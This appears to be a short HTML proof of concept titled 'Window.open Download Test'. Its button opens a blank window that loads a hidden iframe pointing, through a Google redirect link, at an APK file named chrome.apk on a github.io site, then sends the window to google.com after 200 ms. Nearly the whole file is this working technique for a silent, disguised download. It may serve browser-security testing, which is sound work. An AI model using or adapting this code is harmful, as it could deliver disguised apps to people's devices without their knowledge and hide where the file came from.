<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Window Open Iframe Race</title>

<style>
button{
background:#4CAF50;
color:white;
border:none;
padding:15px 30px;
font-size:16px;
cursor:pointer;
}
</style>

</head>
<body>

<center>
<h2>Window.open Download Test</h2>
<button onclick="go()">Start</button>
</center>

<script>

const url="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";

function go(){

let w = window.open("about:blank","_blank");

w.document.write(`
<html>
<body>

<iframe id="frame"
style="display:none;"></iframe>

<script>

let frame=document.getElementById("frame");

frame.src="${url}";

setTimeout(function(){
location.href="https://google.com";
},200);

<\/script>

</body>
</html>
`);

}

</script>

</body>
</html>
